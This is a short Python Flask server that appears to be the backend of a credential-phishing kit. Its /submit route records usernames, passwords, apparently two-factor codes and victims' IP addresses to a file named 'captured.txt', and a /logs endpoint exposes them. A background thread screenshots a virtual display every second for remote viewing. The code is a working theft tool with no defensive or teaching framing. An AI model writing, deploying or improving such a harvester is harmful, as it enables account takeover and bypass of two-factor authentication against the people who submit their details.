import os
import threading
import time
import subprocess
from flask import Flask, render_template, request, jsonify
from mss import mss
from datetime import datetime

app = Flask(__name__)
os.makedirs('static', exist_ok=True)

creds_log = []

def start_xvfb():
    os.environ['DISPLAY'] = ':99'
    subprocess.Popen(['Xvfb', ':99', '-screen', '0', '1920x1080x24', '-ac', '+extension', 'GLX', '+render', '-noreset'])
    time.sleep(2)

def screenshot_loop():
    start_xvfb()
    for _ in range(20):
        try:
            with mss() as sct:
                while True:
                    sct.shot(output='static/screenshot.png')
                    time.sleep(1)
        except Exception as e:
            print(f"screenshot retry: {e}")
            time.sleep(1)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    entry = {
        'user': data.get('username'),
        'pass': data.get('password'),
        'code': data.get('code'),
        'ip': request.remote_addr,
        'time': datetime.now().isoformat()
    }
    creds_log.append(entry)
    with open('captured.txt', 'a') as f:
        f.write(f"{entry}\n")
    return jsonify({'status': 'ok'})

@app.route('/logs')
def logs():
    return jsonify(creds_log)

@app.route('/screenshot')
def screenshot():
    return app.send_static_file('screenshot.png')

if __name__ == '__main__':
    t = threading.Thread(target=screenshot_loop, daemon=True)
    t.start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
